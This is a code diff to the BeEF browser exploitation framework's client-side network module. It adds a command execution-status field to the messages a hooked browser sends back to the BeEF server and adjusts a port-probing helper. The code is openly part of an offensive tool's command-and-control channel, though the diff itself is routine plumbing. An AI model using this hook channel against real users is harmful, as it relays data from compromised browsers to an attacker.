@@ -1,5 +1,5 @@
 //
-// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
+// Copyright (c) 2006-2016 Wade Alcorn - wade@bindshell.net
 // Browser Exploitation Framework (BeEF) - http://beefproject.com
 // See the file 'doc/COPYING' for copying permission
 //
@@ -35,6 +35,7 @@ beef.net = {
     command: function () {
         this.cid = null;
         this.results = null;
+        this.status = null;
         this.handler = null;
         this.callback = null;
     },
@@ -84,13 +85,15 @@ beef.net = {
      * @param: {String} handler: the server-side handler that will be called
      * @param: {Integer} cid: command id
      * @param: {String} results: the data to send
+     * @param: {Integer} status: the result of the command execution (-1, 0 or 1 for 'error', 'unknown' or 'success')
      * @param: {Function} callback: the function to call after execution
      */
-    queue: function (handler, cid, results, callback) {
+    queue: function (handler, cid, results, status, callback) {
         if (typeof(handler) === 'string' && typeof(cid) === 'number' && (callback === undefined || typeof(callback) === 'function')) {
             var s = new beef.net.command();
             s.cid = cid;
             s.results = beef.net.clean(results);
+            s.status = status;
             s.callback = callback;
             s.handler = handler;
             this.cmd_queue.push(s);
@@ -105,22 +108,32 @@ beef.net = {
      * @param: {String} handler: the server-side handler that will be called
      * @param: {Integer} cid: command id
      * @param: {String} results: the data to send
+     * @param: {Integer} exec_status: the result of the command execution (-1, 0 or 1 for 'error', 'unknown' or 'success')
      * @param: {Function} callback: the function to call after execution
+     * @return: {Integer} exec_status: the command module execution status (defaults to 0 - 'unknown' if status is null)
      */
-    send: function (handler, cid, results, callback) {
+    send: function (handler, cid, results, exec_status, callback) {
+        // defaults to 'unknown' execution status if no parameter is provided, otherwise set the status
+        var status = 0;
+        if (exec_status != null && parseInt(Number(exec_status)) == exec_status){ status = exec_status}
+
         if (typeof beef.websocket === "undefined" || (handler === "/init" && cid == 0)) {
-            this.queue(handler, cid, results, callback);
+            this.queue(handler, cid, results, status, callback);
             this.flush();
         } else {
             try {
                 beef.websocket.send('{"handler" : "' + handler + '", "cid" :"' + cid +
                     '", "result":"' + beef.encode.base64.encode(beef.encode.json.stringify(results)) +
-                    '","callback": "' + callback + '","bh":"' + beef.session.get_hook_session_id() + '" }');
+                    '", "status": "' + exec_status +
+                    '", "callback": "' + callback +
+                    '","bh":"' + beef.session.get_hook_session_id() + '" }');
             } catch (e) {
-                this.queue(handler, cid, results, callback);
+                this.queue(handler, cid, results, status, callback);
                 this.flush();
             }
         }
+
+        return status;
     },
 
     /**
@@ -257,6 +270,7 @@ beef.net = {
                 response.status_code = jqXHR.status;
                 response.status_text = textStatus;
                 response.duration = (end_time - start_time);
+                response.port_status = "open";
             },
             complete: function (jqXHR, textStatus) {
                 response.status_code = jqXHR.status;
@@ -273,7 +287,7 @@ beef.net = {
                     response.port_status = "open";
                 }
             }
-        }).done(function () {
+        }).always(function () {
                 if (callback != null) {
                     callback(response);
                 }
